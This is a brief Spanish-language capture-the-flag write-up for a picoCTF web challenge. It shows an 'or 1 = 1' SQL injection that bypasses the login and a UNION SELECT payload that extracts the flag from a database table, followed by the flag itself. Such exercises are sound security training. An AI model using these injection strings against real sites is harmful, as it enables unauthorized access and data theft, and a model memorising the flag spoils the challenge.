## Objetivo
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:54842/).
## Solución
- Al probar la pagina colocándole como usuario: admin y contraseña: admin me dice que es una conexión fallida.
```bash
username: admin
password: admin
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'
```
- Así que cambiamos el valor del usuario por una inyección de código SQL.
```bash
username: admin' or 1 = 1 -- -
password: admin' or 1 = 1 -- -
```
- Una vez dentro ponemos el siguiente texto en el buscador:
```bash
Algiers' union select flag,id,1 from more_table;--
```
- Y al darle en Buscar nos aparecerá la bandera.
```bash
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}
```

## Notas Adicionales
## Referencias